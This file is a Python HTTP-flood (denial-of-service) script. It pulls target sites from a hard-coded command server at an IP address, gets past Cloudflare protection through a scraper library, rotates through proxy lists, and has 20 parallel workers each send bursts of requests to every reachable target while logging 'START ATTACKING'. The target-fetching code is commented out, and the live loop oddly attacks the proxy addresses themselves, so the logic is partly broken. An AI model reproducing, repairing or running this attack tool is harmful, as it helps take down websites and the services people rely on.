import asyncio
import json
import random
from sys import stderr

import requests
from aiocfscrape import CloudflareScraper
from aiohttp import ClientTimeout
from loguru import logger
from urllib3 import disable_warnings

HOSTS = ['http://46.4.63.238/api.php']  # api for getting fucking sites
TIMEOUT = ClientTimeout(
    total=20,
    connect=10,
    sock_read=10,
    sock_connect=10,
)
CUSTOM_PROXY = None  # can be like 'http://login:username@1.2.3.4:5678' OR 'http://1.2.3.4:5678'
CUSTOM_PROXIES_FILE = 'list.txt'  # name of file with list of proxies, each one in separate line
REQUESTS_PER_SITE = 50
PARALLEL_COUNT = 20
SHOW_REQUEST_EXCEPTIONS = False
FORCE_HTTPS = True


def main():
    loop = asyncio.get_event_loop()
    union = asyncio.gather(*[
        start_one()
        for _ in range(PARALLEL_COUNT)
    ])
    loop.run_until_complete(union)


async def start_one():
    while True:
        try:
            '''
            host = random.choice(HOSTS)
            content = requests.get(host).content
            data = json.loads(content)
            url = data['site']['url']
            url = _fix_url(url, force_https=FORCE_HTTPS)
            '''
            async with CloudflareScraper(timeout=TIMEOUT, trust_env=True) as session:
               # success = await attempt(session, url)
                success = False
                if not success:
                    if CUSTOM_PROXIES_FILE:
                        proxies = _load_proxies(CUSTOM_PROXIES_FILE)
                    else:
                        proxies = [
                            f'http://{proxy_data["auth"]}@{proxy_data["ip"]}'
                            for proxy_data in data['proxy']
                        ]
                    random.shuffle(proxies)
                    for proxy in proxies:
                        url = _fix_url(proxy)
                        success = await attempt(session, url)
                        if success:
                            break
        except Exception as e:
            logger.warning(f'Exception, retrying, exception={e}')


def _load_proxies(filename: str) -> list:
    with open(filename, 'r') as file:
        return file.read().splitlines()


def _fix_url(url: str, force_https: bool = False) -> str:
    if not url.startswith('http'):
        url = 'http://' + url
    if force_https:
        url = url.replace('http://', 'https://')
    return url


async def attempt(session: CloudflareScraper, url: str, proxy: str = None) -> bool:
    logger.info(f'\t\tTrying to attack {url} with proxy {proxy}')
    status_code = await request(session, url, proxy)
    if 200 <= status_code < 300:
        logger.info(f'START ATTACKING {url} USING PROXY {proxy}')
        for i in range(REQUESTS_PER_SITE):
            await request(session, url, proxy)
        logger.info(f'ATTACKING {url} IS DONE')
        return True
    return False


async def request(session: CloudflareScraper, url: str, proxy: str = None) -> int:
    try:
        async with session.get(url, proxy=proxy, verify_ssl=False) as response:
            return response.status
    except Exception as e:
        if SHOW_REQUEST_EXCEPTIONS:
            logger.warning(f'Exception on request, exception={e}, url={url}, proxy={proxy}')
        return -1


if __name__ == '__main__':
    logger.remove()
    logger.add(
        stderr,
        format='<white>{time:HH:mm:ss}</white> | <level>{level: <8}</level> | <cyan>{line}</cyan> - <white>{message}</white>'
    )
    disable_warnings()
    main()
